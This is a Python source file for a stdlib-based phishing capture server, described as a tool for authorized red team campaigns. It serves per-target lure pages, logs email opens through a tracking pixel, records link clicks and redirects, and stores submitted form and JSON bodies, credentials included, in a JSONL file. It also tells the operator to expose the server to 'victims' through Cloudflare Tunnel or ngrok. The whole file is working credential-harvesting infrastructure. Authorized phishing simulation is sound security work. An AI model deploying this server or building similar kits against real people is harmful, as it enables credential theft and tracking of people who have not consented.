"""Minimal capture server for authorized Red Team campaigns.

Design:

- ``GET /lure/<token>``  → serves the HTML template from the configured
  directory, replacing ``{{TARGET_EMAIL}}``, ``{{TOKEN}}`` and ``{{CAPTURE_URL}}``.
- ``GET /pixel/<token>.png`` → 1x1 transparent PNG. Records an ``open`` event.
- ``GET /click/<token>?url=...`` → 302 redirect to the supplied URL (validated
  to avoid arbitrary off-domain open-redirect). Records ``click``.
- ``POST /capture/<token>`` → stores the body (form or JSON) into JSONL.

Does NOT use Flask to avoid dependencies. The stdlib `http.server` +
`socketserver` is enough for an engagement capture server; behind Cloudflare
Tunnel or nginx the operator gets TLS + WAF.

Credentials in JSONL are sensitive: the operator is responsible for cleaning
the file after the engagement.
"""

from __future__ import annotations

import argparse
import base64
import json
import os
import socketserver
import sys
import threading
import time
import urllib.parse
from dataclasses import dataclass
from http.server import BaseHTTPRequestHandler
from pathlib import Path
from typing import Optional, Tuple


DEFAULT_CAPTURE_PATH = Path.home() / ".secemail" / "captures.jsonl"

# 1x1 transparent PNG. Pre-generated to avoid a Pillow dependency.
_TRANSPARENT_PNG_B64 = (
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+P+/HgAFhAJ/wlseKgAAAABJRU5ErkJggg=="
)
TRANSPARENT_PNG = base64.b64decode(_TRANSPARENT_PNG_B64)


def _now_utc_iso() -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())


def _ensure_parent(path: Path) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)


@dataclass
class CaptureConfig:
    templates_dir: Path
    storage_path: Path = DEFAULT_CAPTURE_PATH
    default_template: str = "index.html"
    # Redirect policy: by default only allows allowlisted hosts
    # (empty list => any URL allowed, operator-responsible mode).
    redirect_allowlist: Tuple[str, ...] = ()


class CaptureState:
    """State shared between server threads."""

    def __init__(self, config: CaptureConfig):
        self.config = config
        _ensure_parent(config.storage_path)
        self._lock = threading.Lock()

    def log_event(
        self,
        event: str,
        token: str,
        client_addr: str,
        user_agent: str,
        target_email: Optional[str] = None,
        body: Optional[dict] = None,
    ) -> None:
        entry = {
            "ts_utc": _now_utc_iso(),
            "event": event,
            "token": token,
            "client_ip": client_addr,
            "user_agent": user_agent,
            "target_email": target_email,
            "body": body,
        }
        line = json.dumps(entry, ensure_ascii=False)
        with self._lock, self.config.storage_path.open("a", encoding="utf-8") as fh:
            fh.write(line + "\n")


def _load_target_for_token(token: str) -> Optional[str]:
    """Best-effort: read the tracking mapping to associate token → email."""

    try:
        from .tracking import Tracker  # late import to avoid cycles
    except ImportError:
        return None
    try:
        entry = Tracker().lookup(token)
    except Exception:
        return None
    return entry.target_email if entry else None


def _safe_token(value: str) -> str:
    # Hex/UUID-ish only: letters, digits, dashes. Up to 64 chars.
    cleaned = "".join(ch for ch in value if ch.isalnum() or ch in "-_")
    return cleaned[:64]


class CaptureHandler(BaseHTTPRequestHandler):
    """HTTP handler for the capture server.

    State is injected via ``server.state`` (see ``build_server``).
    """

    server_version = "SecEmailCapture/0.3"

    # Silence the standard log (we route to JSONL).
    def log_message(self, format: str, *args) -> None:  # noqa: A002
        return

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------
    @property
    def state(self) -> CaptureState:
        return self.server.state  # type: ignore[attr-defined]

    def _client_ip(self) -> str:
        return self.client_address[0] if self.client_address else "?"

    def _user_agent(self) -> str:
        return self.headers.get("User-Agent", "")[:512]

    def _serve_text(self, code: int, body: str, content_type: str = "text/plain; charset=utf-8") -> None:
        encoded = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(encoded)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(encoded)

    def _serve_bytes(self, code: int, body: bytes, content_type: str) -> None:
        self.send_response(code)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def _serve_redirect(self, code: int, location: str) -> None:
        self.send_response(code)
        self.send_header("Location", location)
        self.send_header("Cache-Control", "no-store")
        self.send_header("Content-Length", "0")
        self.end_headers()

    # ------------------------------------------------------------------
    # Routing
    # ------------------------------------------------------------------
    def do_GET(self) -> None:  # noqa: N802 (BaseHTTPRequestHandler requires this name)
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path

        if path.startswith("/lure/"):
            token = _safe_token(path[len("/lure/"):])
            return self._handle_lure(token)

        if path.startswith("/pixel/") and path.endswith(".png"):
            token = _safe_token(path[len("/pixel/"):-len(".png")])
            return self._handle_pixel(token)

        if path.startswith("/click/"):
            token = _safe_token(path[len("/click/"):])
            qs = urllib.parse.parse_qs(parsed.query)
            url = qs.get("url", [""])[0]
            return self._handle_click(token, url)

        return self._serve_text(404, "not found")

    def do_POST(self) -> None:  # noqa: N802
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path

        if path.startswith("/capture/"):
            token = _safe_token(path[len("/capture/"):])
            return self._handle_capture(token)

        return self._serve_text(404, "not found")

    # ------------------------------------------------------------------
    # Endpoints
    # ------------------------------------------------------------------
    def _handle_lure(self, token: str) -> None:
        cfg = self.state.config
        templates_dir = cfg.templates_dir

        # Try <token>.html first for advanced per-target customization;
        # fall back to default_template otherwise.
        per_token = templates_dir / f"{token}.html"
        if per_token.is_file():
            template_path = per_token
        else:
            template_path = templates_dir / cfg.default_template
            if not template_path.is_file():
                return self._serve_text(500, f"template not found: {template_path.name}")

        try:
            html = template_path.read_text(encoding="utf-8")
        except OSError as exc:
            return self._serve_text(500, f"template error: {exc}")

        target_email = _load_target_for_token(token) or ""
        host_hdr = self.headers.get("Host", "")
        scheme = "https" if self.headers.get("X-Forwarded-Proto", "http").lower() == "https" else "http"
        capture_base = f"{scheme}://{host_hdr}" if host_hdr else ""

        rendered = (
            html.replace("{{TARGET_EMAIL}}", target_email)
            .replace("{{TOKEN}}", token)
            .replace("{{CAPTURE_URL}}", f"{capture_base}/capture/{token}")
            .replace("{{PIXEL_URL}}", f"{capture_base}/pixel/{token}.png")
        )

        self.state.log_event(
            "lure_view",
            token=token,
            client_addr=self._client_ip(),
            user_agent=self._user_agent(),
            target_email=target_email or None,
        )
        self._serve_bytes(200, rendered.encode("utf-8"), "text/html; charset=utf-8")

    def _handle_pixel(self, token: str) -> None:
        target_email = _load_target_for_token(token)
        self.state.log_event(
            "open",
            token=token,
            client_addr=self._client_ip(),
            user_agent=self._user_agent(),
            target_email=target_email,
        )
        self._serve_bytes(200, TRANSPARENT_PNG, "image/png")

    def _handle_click(self, token: str, url: str) -> None:
        target_email = _load_target_for_token(token)

        cfg = self.state.config

        # ALWAYS validate: if a URL is present, the scheme must be http/https.
        # Blocks data:/javascript:/file: and other vectors. Even when the
        # allowlist is empty (default), we never open-redirect to risky schemes.
        if url:
            parsed = urllib.parse.urlparse(url)
            scheme = (parsed.scheme or "").lower()
            if scheme not in {"http", "https"}:
                self.state.log_event(
                    "click_rejected",
                    token=token,
                    client_addr=self._client_ip(),
                    user_agent=self._user_agent(),
                    target_email=target_email,
                    body={"requested_url": url, "reason": "invalid_scheme"},
                )
                return self._serve_text(400, "redirect scheme must be http or https")

            # Extra validation: if an allowlist is configured, the host must be inside it.
            if cfg.redirect_allowlist:
                host = (parsed.hostname or "").lower()
                if not any(host == a or host.endswith("." + a) for a in cfg.redirect_allowlist):
                    self.state.log_event(
                        "click_rejected",
                        token=token,
                        client_addr=self._client_ip(),
                        user_agent=self._user_agent(),
                        target_email=target_email,
                        body={"requested_url": url, "reason": "host_not_allowlisted"},
                    )
                    return self._serve_text(400, "redirect target not allowlisted")

        # No URL: redirect to the lure (safe relative path).
        if not url:
            target_url = f"/lure/{token}"
        else:
            target_url = url

        self.state.log_event(
            "click",
            token=token,
            client_addr=self._client_ip(),
            user_agent=self._user_agent(),
            target_email=target_email,
            body={"requested_url": url},
        )
        self._serve_redirect(302, target_url)

    def _handle_capture(self, token: str) -> None:
        # Reject chunked Transfer-Encoding (we don't support chunked reads):
        # better than silently losing the capture.
        te = (self.headers.get("Transfer-Encoding") or "").lower()
        if "chunked" in te:
            return self._serve_text(411, "Length Required (chunked encoding not supported)")
        # Validate Content-Length: any non-numeric value is 400 (DoS defense).
        raw_length = self.headers.get("Content-Length", "0") or "0"
        try:
            length = int(raw_length)
        except (TypeError, ValueError):
            return self._serve_text(400, "invalid Content-Length")
        if length < 0:
            return self._serve_text(400, "invalid Content-Length")
        max_body = 64 * 1024
        if length > max_body:
            return self._serve_text(413, "payload too large")
        raw = self.rfile.read(length) if length > 0 else b""

        content_type = (self.headers.get("Content-Type") or "").lower()
        parsed_body: object
        if "application/json" in content_type:
            try:
                parsed_body = json.loads(raw.decode("utf-8", errors="replace") or "{}")
            except json.JSONDecodeError:
                parsed_body = {"_raw": raw.decode("utf-8", errors="replace")}
        elif "application/x-www-form-urlencoded" in content_type:
            parsed_body = {
                k: v[0] if v else ""
                for k, v in urllib.parse.parse_qs(raw.decode("utf-8", errors="replace")).items()
            }
        else:
            parsed_body = {"_raw": raw.decode("utf-8", errors="replace")[:4096]}

        target_email = _load_target_for_token(token)
        self.state.log_event(
            "submit",
            token=token,
            client_addr=self._client_ip(),
            user_agent=self._user_agent(),
            target_email=target_email,
            body=parsed_body if isinstance(parsed_body, dict) else {"data": parsed_body},
        )
        self._serve_text(200, json.dumps({"ok": True}), "application/json")


class _ThreadingServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    daemon_threads = True
    allow_reuse_address = True
    state: CaptureState  # assigned in build_server


def build_server(
    bind: str,
    port: int,
    config: CaptureConfig,
) -> _ThreadingServer:
    server = _ThreadingServer((bind, port), CaptureHandler)
    server.state = CaptureState(config)
    return server


def serve_forever(
    bind: str = "127.0.0.1",
    port: int = 8443,
    templates_dir: str = "phishing_templates",
    storage_path: Optional[str] = None,
    default_template: str = "index.html",
) -> None:
    cfg = CaptureConfig(
        templates_dir=Path(templates_dir),
        storage_path=Path(storage_path) if storage_path else DEFAULT_CAPTURE_PATH,
        default_template=default_template,
    )
    if not cfg.templates_dir.is_dir():
        raise SystemExit(f"templates_dir does not exist: {cfg.templates_dir}")
    server = build_server(bind, port, cfg)
    print(
        f"[capture] listening on {bind}:{port} -> templates={cfg.templates_dir} "
        f"storage={cfg.storage_path}",
        file=sys.stderr,
    )
    if bind in ("127.0.0.1", "localhost", "::1"):
        print(
            "[capture] NOTE: bound to localhost only. Victims will not reach this "
            "directly. Front this port with Cloudflare Tunnel, ngrok, or an "
            "nginx/TLS reverse proxy and verify the public URL resolves before "
            "sending any lure.",
            file=sys.stderr,
        )
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.shutdown()
        server.server_close()


def _cli(argv=None) -> int:
    p = argparse.ArgumentParser(prog="secemail-capture", description="Capture server (red team)")
    p.add_argument("--bind", default="127.0.0.1")
    p.add_argument("--port", type=int, default=8443)
    p.add_argument("--templates-dir", default="phishing_templates")
    p.add_argument("--storage-path", default=None)
    p.add_argument("--default-template", default="index.html")
    args = p.parse_args(argv)
    serve_forever(
        bind=args.bind,
        port=args.port,
        templates_dir=args.templates_dir,
        storage_path=args.storage_path,
        default_template=args.default_template,
    )
    return 0


__all__ = [
    "CaptureConfig",
    "CaptureState",
    "CaptureHandler",
    "DEFAULT_CAPTURE_PATH",
    "TRANSPARENT_PNG",
    "build_server",
    "serve_forever",
]


if __name__ == "__main__":
    raise SystemExit(_cli())
